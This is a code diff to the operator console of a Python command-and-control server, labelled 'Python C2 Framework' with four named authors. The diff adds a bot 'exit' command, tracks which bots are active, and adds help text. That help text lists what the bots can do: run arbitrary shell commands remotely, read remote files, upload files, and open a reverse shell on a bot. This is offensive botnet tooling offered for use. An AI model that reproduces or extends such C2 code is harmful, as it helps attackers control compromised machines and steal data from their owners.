@@ -46,6 +46,8 @@ async def parse_command_from_cli(rest: list[str]) -> Command:
             return Command.write(rest[1], b64)
         case "execute":
             return Command.execute(rest[1], rest[2:])
+        case "exit":
+            return Command.exit()
         case _:
             raise Exception(f"unknown command action '{rest[0]}'")
 
@@ -56,6 +58,8 @@ async def queue_command_on_single_bot(ctx: GlobalContext, args: list[str]) -> No
 
     if not ctx.command_one(id, cmd):
         print(f"unknown bot '{id}', failed to execute")
+    elif not ctx.bot_active(id):
+        print(f"bot {id} is inactive, failed to execute")
     else:
         print(f"queued command on '{id}' successfully")
 
@@ -64,7 +68,7 @@ async def queue_command_on_all(ctx: GlobalContext, args: list[str]) -> None:
     cmd = await parse_command_from_cli(args[0:])
     ctx.command_all(cmd)
 
-    print(f"queued command on '{ctx.known_bots()}' bots successfully")
+    print(f"queued command on '{ctx.active_bots()}' bots successfully")
 
 
 def server_status(ctx: GlobalContext) -> None:
@@ -75,7 +79,7 @@ def server_status(ctx: GlobalContext) -> None:
     print(f"    all known bots:")
 
     for id in ctx.all_known_ids():
-        print(f"        {id}")
+        print(f"        {id}{(' (inactive)' if not ctx.bot_active(id) else '')}")
 
 
 async def main():
@@ -102,6 +106,11 @@ async def main():
 
     # note: the type hint is for my editor"s autocomplete
     ctx: GlobalContext = app["ctx"]
+
+    print(("Python C2 Framework\n\n"
+           "  Written by Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler\n"
+           "  Type 'status' to see connected bots or '?' for options.\n"
+    ))
 
     while True:
         text: str = await aioconsole.ainput("> ")
@@ -137,11 +146,23 @@ async def main():
                        "  'all': Execute payload on all bots\n"
                        "     all <command>\n\n"
                        "  'status': Show status of connected bots\n"
-                       "     status\n"
+                       "     status\n\n"
                        "  'shell': Opens a reverse shell on a specific bot\n"
-                       "     shell <id>\n"
+                       "     shell <id>\n\n"
                        "  'exit': Kill the server\n"
-                       "     exit\n"))
+                       "     exit\n"
+                ))
+                print(("Bot Payloads:\n\n"
+                       "  'run': Run command on remote system\n"
+                       "     run <shell> <command>\n\n"
+                       "  'read': Read contents of remote file\n"
+                       "     read <path>\n\n"
+                       "   'write': Upload local file to remote system\n"
+                       "     write <remote path> <local path>\n\n"
+                       "   'exit': Stop bot execution\n"
+                       "     exit\n"   
+                ))
+        
         except Exception as e:
             print(f"unable to run command '{text}'. reason:")
             print(f"    {repr(e)}")
